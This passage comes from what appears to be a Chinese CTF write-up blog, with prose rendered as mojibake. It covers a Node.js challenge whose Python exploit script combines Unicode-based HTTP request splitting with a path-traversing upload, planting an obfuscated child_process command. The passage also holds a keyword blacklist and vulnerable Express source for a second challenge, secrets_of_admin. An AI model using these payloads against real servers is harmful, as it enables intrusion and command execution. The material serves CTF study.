&#123;</span><br><span class="line">                            res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;</span><br><span class="line">                        res.send(e.message);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">function blacklist(url) &#123;</span><br><span class="line">    var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#x27;&quot;, &quot;!&quot;];</span><br><span class="line">    var arrayLen = evilwords.length;</span><br><span class="line">    for (var i = 0; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        const trigger = url.includes(evilwords[i]);</span><br><span class="line">        if (trigger === true) &#123;</span><br><span class="line">            return true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var server = app.listen(8081, function() &#123;</span><br><span class="line">    var host = server.address().address</span><br><span class="line">    var port = server.address().port</span><br><span class="line">    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ËøôÈ¢òÊÄùË∑ØËøòÊòØÊØîËæÉÁÆÄÂçïÁöÑÔºåÁÆÄÂçïÂÖàÊù•Ëß£ÊûêËøôÊÆµÊ∫êÁ†Å</p>
<p>ÂæàÊòéÊòæÁöÑÊòØËÆæÂÆö‰∫ÜÂá†‰∏™Ë∑ØÁî±Âíå‰∏Ä‰∏™ÈªëÂêçÂçï</p>
<p>ÂÖàÊù•ÁúãÂá†‰∏™Ë∑ØÁî±ÁöÑÂÜÖÂÆπ</p>
<p><strong>&#x2F;<strong>Ë∑ØÁî±‰∏ãÔºåÂØπ‰º†ÂÖ•ÁöÑÁõÆÂΩïËøõË°å‰∫ÜÈôêÂà∂Ôºå‰ΩÜÂèØ‰ª•ÈÄöËøá</strong>pug</strong>Ê®°ÊùøÊ∏≤Êüì<code>/template</code>ÁõÆÂΩï‰∏ãÊåáÂÆöÁöÑÊñá‰ª∂</p>
<p><strong>file_upload</strong>Ë∑ØÁî±ÊúâÂØπ<strong>IP</strong>ÁöÑÈôêÂà∂ÔºåÂæàÊòéÊòæÈúÄË¶ÅÂÄüÂä©SSRFÔºåËøôÈáå<code>var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;</code>‰∏≠ÁöÑ<code>mimetype</code>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá<code>Content-Type</code>ËøõË°åÊéßÂà∂ÔºåÂ¶ÇÊûúÊîπ‰∏∫<code>../template</code>ÔºåÁªèËøáÊãºÊé•ÂêéÔºåÊñá‰ª∂ÁöÑ‰øùÂ≠òÁõÆÂΩïÂ∞±‰ºöÂèòÊàê<code>_dirname/uploads/../template/shell.pug</code>„ÄÇËøôÊ†∑Â∞±ÂèØ‰ª•‰øùÂ≠òÂà∞<code>/template</code>ÁõÆÂΩï‰∏ãÔºåÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá‰∏äÈù¢ÁöÑ<code>action</code>ËøõË°åÊ∏≤ÊüìÔºå‰πüÂèØ‰ª•ÈÄöËøáÁõ¥Êé•ÊûÑÈÄ†ÂëΩ‰ª§ÔºåÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å</p>
<p><strong>core</strong>Ë∑ØÁî±‰∏≠ÔºåÂÖàÊòØÂØπÂèÇÊï∞<code>q</code>ÁöÑÂÜÖÂÆπËøõË°åÊ£ÄÊü•ÔºåÂ¶ÇÊûúÈÄöËøá‰∫ÜÊ£ÄÊü•ÔºåÂ∞±‰ºöÈÄöËøá<strong>ÂÜÖÁΩëURL</strong>ÂèëËµ∑‰∏ÄÊ¨°<strong>GET</strong>ËØ∑Ê±Ç<code>/source</code>ÁõÆÂΩïÔºåËøôÈáåÊòæÁÑ∂Â∞±ÂèØ‰ª•ËøõË°åSSRF</p>
<p>‰ΩÜËøôÈáåÂ≠òÂú®‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ∞±ÊòØËôΩÁÑ∂Â≠òÂú®ÂÜÖÁΩëËØ∑Ê±ÇÔºå‰ΩÜÊòØË¢´ÁªëÂÆöÂú®‰∫Ü**&#x2F;source**ÁõÆÂΩï‰∏ã</p>
<p>ÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞ÊºèÊ¥ûÁÇπÂú®<code>http.get(url, function(resp)</code>ÔºåÂà©Áî®HTTPËØ∑Ê±ÇÊãÜÂàÜÊºèÊ¥ûÊù•ÂÆûÁé∞</p>
<blockquote>
<p>ÂΩì Node.js ‰ΩøÁî® <strong>http.get</strong> ÂêëÁâπÂÆöË∑ØÂæÑÂèëÂá∫HTTP ËØ∑Ê±ÇÊó∂ÔºåÂèëÂá∫ÁöÑËØ∑Ê±ÇÂÆûÈôÖ‰∏äË¢´ÂÆöÂêëÂà∞‰∫Ü‰∏ç‰∏ÄÊ†∑ÁöÑË∑ØÂæÑÔºåËøôÊòØÂõ†‰∏∫NodeJS ‰∏≠ <strong>Unicode Â≠óÁ¨¶ÊçüÂùè</strong>ÂØºËá¥ÁöÑ HTTP ÊãÜÂàÜÊîªÂáª</p>
<p>ÂØπ‰∫é‰∏çÂåÖÂê´‰∏ª‰ΩìÁöÑËØ∑Ê±ÇÔºåNode.jsÈªòËÆ§‰ΩøÁî®‚Äúlatin1‚ÄùÔºåËøôÊòØ‰∏ÄÁßçÂçïÂ≠óËäÇÁºñÁ†ÅÂ≠óÁ¨¶ÈõÜÔºå‰∏çËÉΩË°®Á§∫È´òÁºñÂè∑ÁöÑUnicodeÂ≠óÁ¨¶ÔºåÊâÄ‰ª•ÔºåÂΩìÊàë‰ª¨ÁöÑËØ∑Ê±ÇË∑ØÂæÑ‰∏≠Âê´ÊúâÂ§öÂ≠óËäÇÁºñÁ†ÅÁöÑUnicodeÂ≠óÁ¨¶Êó∂Ôºå‰ºöË¢´Êà™Êñ≠ÂèñÊúÄ‰ΩéÂ≠óËäÇÔºåÊØîÂ¶Ç <code>\u0130</code> Â∞±‰ºöË¢´Êà™Êñ≠‰∏∫ <code>\u30</code></p>
</blockquote>
<p>ÂΩì <strong>Node.js v8 ÊàñÊõ¥‰ΩéÁâàÊú¨</strong>ÂØπÊ≠§URLÂèëÂá∫ <code>GET</code> ËØ∑Ê±Ç<code>\u010D\u010A</code>Êó∂ÔºåÂÆÉ‰∏ç‰ºöËøõË°åÁºñÁ†ÅËΩ¨‰πâÔºåÂõ†‰∏∫ÂÆÉ‰ª¨‰∏çÊòØHTTPÊéßÂà∂Â≠óÁ¨¶Ôºå‰ΩÜÊòØÂΩìÁªìÊûúÂ≠óÁ¨¶‰∏≤<strong>Ë¢´ÁºñÁ†Å‰∏∫ latin1</strong> ÂÜôÂÖ•Ë∑ØÂæÑÊó∂ÔºåËøô‰∫õÂ≠óÁ¨¶Â∞ÜÂàÜÂà´Ë¢´Êà™Êñ≠‰∏∫ ‚Äú\r‚ÄùÔºà%0dÔºâÂíå ‚Äú\n‚ÄùÔºà%0aÔºâ</p>
<p>node8ÊúâÂØπÂõûËΩ¶Êç¢Ë°å(HTTPÂçèËÆÆÊéßÂà∂Â≠óÁ¨¶)ËøõË°åÂ§ÑÁêÜ</p>
<p><img src="/../image/586.png" class="lazyload" data-srcset="/../image/586.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="586"></p>
<p>‰ΩÜÊòØÂÆÉÂØπUnicodeÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏ç‰ºöËøõË°åÂ§ÑÁêÜÔºåÂõ†‰∏∫‰ªñ‰ª¨Âπ∂‰∏çÊòØHTTPÂçèËÆÆ‰∏≠ÁöÑÊéßÂà∂Â≠óÁ¨¶Ôºå‰ΩÜÂõ†‰∏∫node.jsÈªòËÆ§‰ΩøÁî®<code>latin1</code>ÁºñÁ†ÅÔºåÊâÄ‰ª•ÂÆÉÂú®Â§ÑÁêÜÈ´ò‰ΩçunicodeÂ≠óÁ¨¶Êó∂‰ºö‰∫ßÁîüÊà™Êñ≠‰ªéËÄå‰ºöËÆ©Êüê‰∫õÁâπÂÆöÂ≠óÁ¨¶‰∫ßÁîüÂõûËΩ¶Êç¢Ë°å„ÄÇ</p>
<p><img src="/../image/587.png" class="lazyload" data-srcset="/../image/587.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="587"></p>
<p>ËøôÈáåÂÖ∂ÂÆûÁúãÁöÑÊúâÁÇπÂçäÊáµÂçäÊáÇÁöÑÁä∂ÊÄÅÔºå‰πüÂ∞±ËØ¥Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†unicodeÂ≠óÁ¨¶Êù•ËøõË°å<strong>httpËØ∑Ê±ÇËµ∞ÁßÅ</strong>ÔºåÁÑ∂ÂêéÂÜçÈÄöËøáÊûÑÈÄ†<strong>mimetype</strong>Êù•ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å</p>
<p>Âõ†‰∏∫ÂÅöÁöÑÊó∂ÂÄôÊ≤°ÊúâÂ§™ÊòéÁôΩÔºåÊÑüËßâÂ•ΩÂÉèÊáÇ‰∫ÜÂéüÁêÜÔºå‰ΩÜÊòØËá™Â∑±ÊûÑÈÄ†‰∏çÂá∫Êù•ÔºåËøôÈáåÂ∞±Áõ¥Êé•Ë¥¥‰∏Ä‰∏™ËÑöÊú¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST /file_upload HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA</span><br><span class="line">Content-Length: &#123;&#125;</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: keep-alive </span><br><span class="line"></span><br><span class="line">&#123;&#125;&#x27;&#x27;&#x27;</span><br><span class="line">body=&#x27;&#x27;&#x27;------WebKitFormBoundaryO9LPoNAg9lWRUItA</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.pug&quot;</span><br><span class="line">Content-Type: ../template</span><br><span class="line"></span><br><span class="line">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="line">-return x</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryO9LPoNAg9lWRUItA--</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">more=&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">GET /anythingelse HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#x27;&#x27;&#x27;</span><br><span class="line">payload = payload.format(len(body)+10,body)+more</span><br><span class="line">payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload = &#x27;&#x27;.join(chr(int(&#x27;0xff&#x27; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.trust_env = False</span><br><span class="line">session.get(&#x27;http://1e1f41d5-6909-4538-a4c1-be1020cc04a7.node4.buuoj.cn:81/core?q=&#x27; + urllib.parse.quote(payload))</span><br><span class="line"># response = session.get(&#x27;http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg&#x27;)</span><br><span class="line"># print(response.text)</span><br></pre></td></tr></table></figure>



<h2 id="2021Á••‰∫ëÊùØ-secrets-of-admin"><a href="#2021Á••‰∫ëÊùØ-secrets-of-admin" class="headerlink" title="[2021Á••‰∫ëÊùØ]secrets_of_admin"></a>[2021Á••‰∫ëÊùØ]secrets_of_admin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">import * as express from &#x27;express&#x27;;</span><br><span class="line">import &#123; Request, Response, NextFunction &#125; from &#x27;express&#x27;;</span><br><span class="line">import * as createError from &quot;http-errors&quot;;</span><br><span class="line">import * as pdf from &#x27;html-pdf&#x27;;</span><br><span class="line">import DB from &#x27;../database&#x27;;</span><br><span class="line">import * as fs from &#x27;fs&#x27;;</span><br><span class="line">import * as path from &#x27;path&#x27;;</span><br><span class="line">import * as crypto from &#x27;crypto&#x27;;</span><br><span class="line">import &#123; promisify &#125; from &#x27;util&#x27;;</span><br><span class="line">import &#123; v4 as uuid  &#125; from &#x27;uuid&#x27;;</span><br><span class="line"></span><br><span class="line">const readFile = promisify(fs.readFile)</span><br><span class="line"></span><br><span class="line">const getCheckSum = (filename: string): Promise&lt;string&gt; =&gt; &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        const shasum = crypto.createHash(&#x27;md5&#x27;);</span><br><span class="line">        try &#123;</span><br><span class="line">            const s = fs.createReadStream(path.join(__dirname , &quot;../files/&quot;, filename));</span><br><span class="line">            s.on(&#x27;data&#x27;, (data) =&gt; &#123;</span><br><span class="line">                shasum.update(data)</span><br><span class="line">            &#125;)</span><br><span class="line">            s.on(&#x27;end&#x27;, () =&gt; &#123;</span><br><span class="line">                return resolve(shasum.digest(&#x27;hex&#x27;));</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const checkAuth = (req: Request, res:Response, next:NextFunction) =&gt; &#123;</span><br><span class="line">    let token = req.signedCookies[&#x27;token&#x27;]</span><br><span class="line">    if (token &amp;&amp; token[&quot;username&quot;]) &#123;</span><br><span class="line">        if (token.username === &#x27;superuser&#x27;)&#123;</span><br><span class="line">            next(createError(404)) // superuser is disabled since you can&#x27;t even find it in database :)</span><br><span class="line">        &#125;</span><br><span class="line">        if (token.isAdmin === true) &#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return res.redirect(&#x27;/&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        next(createError(404));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const router = express.Router();</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, (_, res) =&gt; res.render(&#x27;index&#x27;, &#123; message: `Only admin&#x27;s function is implemented. üòñ `&#125;))</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    let &#123; username, password &#125; = req.body;</span><br><span class="line">    if ( username &amp;&amp; password) &#123;</span><br><span class="line">        if ( username == &#x27;&#x27; || typeof(username) !== &quot;string&quot; || password == &#x27;&#x27; || typeof(password) !== &quot;string&quot; ) &#123;</span><br><span class="line">            return res.render(&#x27;index&#x27;, &#123; error: &#x27;Parameters error üëª&#x27;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        let data = await DB.Login(username, password)</span><br><span class="line">        if(!data) &#123;</span><br><span class="line">            return res.render(&#x27;index&#x27;, &#123; error : &#x27;You are not admin üò§&#x27;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.cookie(&#x27;token&#x27;, &#123;</span><br><span class="line">            username: username,</span><br><span class="line">            isAdmin: true </span><br><span class="line">        &#125;, &#123; signed: true &#125;)</span><br><span class="line">        res.redirect(&#x27;/admin&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return res.render(&#x27;index&#x27;, &#123; error : &#x27;Parameters cannot be blank üòí&#x27;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/admin&#x27;, checkAuth, async (req, res) =&gt; &#123;</span><br><span class="line">    let token = req.signedCookies[&#x27;token&#x27;];</span><br><span class="line">    try &#123;</span><br><span class="line">        const files = await DB.listFile(token.username);</span><br><span class="line">        if (files) &#123;</span><br><span class="line">            res.cookie(&#x27;token&#x27;, &#123;username: token.username, files: files, isAdmin: true &#125;, &#123; signed: true &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        return res.render(&#x27;admin&#x27;, &#123; error: &#x27;Something wrong ... üëª&#x27;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    return res.render(&#x27;admin&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/admin&#x27;, checkAuth, (req, res, next) =&gt; &#123;</span><br><span class="line">    let &#123; content &#125; = req.body;</span><br><span class="line">    if ( content == &#x27;&#x27; || content.includes(&#x27;&lt;&#x27;) || content.includes(&#x27;&gt;&#x27;) || content.includes(&#x27;/&#x27;) || content.includes(&#x27;script&#x27;) || content.includes(&#x27;on&#x27;))&#123;</span><br><span class="line">        // even admin can&#x27;t be trusted right ? :)  </span><br><span class="line">        return res.render(&#x27;admin&#x27;, &#123; error: &#x27;Forbidden word ü§¨&#x27;&#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let template = `</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">        &lt;h3&gt;$&#123;content&#125;&lt;/h3&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        `</span><br><span class="line">        try &#123;</span><br><span class="line">            const filename = `$&#123;uuid()&#125;.pdf`</span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                &quot;format&quot;: &quot;Letter&quot;,</span><br><span class="line">                &quot;orientation&quot;: &quot;portrait&quot;,</span><br><span class="line">                &quot;border&quot;: &quot;0&quot;,</span><br><span class="line">                &quot;type&quot;: &quot;pdf&quot;,</span><br><span class="line">                &quot;renderDelay&quot;: 3000,</span><br><span class="line">                &quot;timeout&quot;: 5000</span><br><span class="line">            &#125;).toFile(`./files/$&#123;filename&#125;`, async (err, _) =&gt; &#123;</span><br><span class="line">                if (err) next(createError(500));</span><br><span class="line">                const checksum = await getCheckSum(filename);</span><br><span class="line">                await DB.Create(&#x27;superuser&#x27;, filename, checksum)</span><br><span class="line">                return res.render(&#x27;admin&#x27;, &#123; message : `Your pdf is successfully saved ü§ë You know how to download it right?`&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.render(&#x27;admin&#x27;, &#123; error : &#x27;Failed to generate pdf üò•&#x27;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// You can also add file logs here!</span><br><span class="line">router.get(&#x27;/api/files&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class="line">    if (req.socket.remoteAddress.replace(/^.*:/, &#x27;&#x27;) != &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">        return next(createError(401));</span><br><span class="line">    &#125;</span><br><span class="line">    let &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    if (typeof(username) == &quot;string&quot; &amp;&amp; typeof(filename) == &quot;string&quot; &amp;&amp; typeof(checksum) == &quot;string&quot;) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            await DB.Create(username, filename, checksum)</span><br><span class="line">            return res.send(&#x27;Done&#x27;)</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.send(&#x27;Error!&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return res.send(&#x27;Parameters error&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/api/files/:id&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    let token = req.signedCookies[&#x27;token&#x27;]</span><br><span class="line">    if (token &amp;&amp; token[&#x27;username&#x27;]) &#123;</span><br><span class="line">        if (token.username == &#x27;superuser&#x27;) &#123;</span><br><span class="line">            return res.send(&#x27;Superuser is disabled now&#x27;);   </span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            let filename = await DB.getFile(token.username, req.params.id)</span><br><span class="line">            if (fs.existsSync(path.join(__dirname , &quot;../files/&quot;, filename)))&#123;</span><br><span class="line">                return res.send(await readFile(path.join(__dirname , &quot;../files/&quot;, filename)));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return res.send(&#x27;No such file!&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (err) &#123;</span><br><span class="line">            return res.send(&#x27;Error!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return res.redirect(&#x27;/&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">export default router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÈôÑ‰ª∂ÈáåÊúâ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÊñá‰ª∂ÔºåÊâìÂºÄÂêéÂèØ‰ª•ÂèëÁé∞Ë¥¶Âè∑ÂØÜÁ†Å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (1, &#x27;admin&#x27;,&#x27;e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645&#x27;);</span><br></pre></td></tr></table></figure>

<p>ÂêåÊó∂Âú®‰∏ãÈù¢ÂèëÁé∞‰∏ÄÊÆµÂèØËÉΩÊúâÁî®ÁöÑÊï∞ÊçÆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO files (username, filename, checksum) VALUES (&#x27;superuser&#x27;,&#x27;flag&#x27;,&#x27;be5a14a8e504a66979f6938338b0662c&#x27;);`);</span><br></pre></td></tr></table></figure>

<p>ÁÑ∂ÂêéÊàë‰ª¨Êù•‰∏ªË¶ÅÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™index.ts</p>
<p>Êàë‰ª¨ÈáçÁÇπÊù•ÁúãÂá†‰∏™Ë∑ØÁî±‰∏äÁöÑÂÆö‰πâ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/&#x27;, (_, res) =&gt; res.render(&#x27;index&#x27;, &#123; message: `Only admin&#x27;s function is implemented. üòñ `&#125;))</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/&#x27;, async (req, res) =&gt; &#123;</span><br><span class="line">    let &#123; username, password &#125; = req.body;</span><br><span class="line">    if ( username &amp;&amp; password) &#123;</span><br><span class="line">        if ( username == &#x27;&#x27; || typeof(username) !== &quot;string&quot; || password == &#x27;&#x27; || typeof(password) !== &quot;string&quot; ) &#123;</span><br><span class="line">            return res.render(&#x27;index&#x27;, &#123; error: &#x27;Parameters error üëª&#x27;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        let data = await DB.Login(username, password)</span><br><span class="line">        if(!data) &#123;</span><br><span class="line">            return res.render(&#x27;index&#x27;, &#123; error : &#x27;You are not admin üò§&#x27;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.cookie(&#x27;token&#x27;, &#123;</span><br><span class="line">            username: username,</span><br><span class="line">            isAdmin: true </span><br><span class="line">        &#125;, &#123; signed: true &#125;)</span><br><span class="line">        res.redirect(&#x27;/admin&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return res.render(&#x27;index&#x27;, 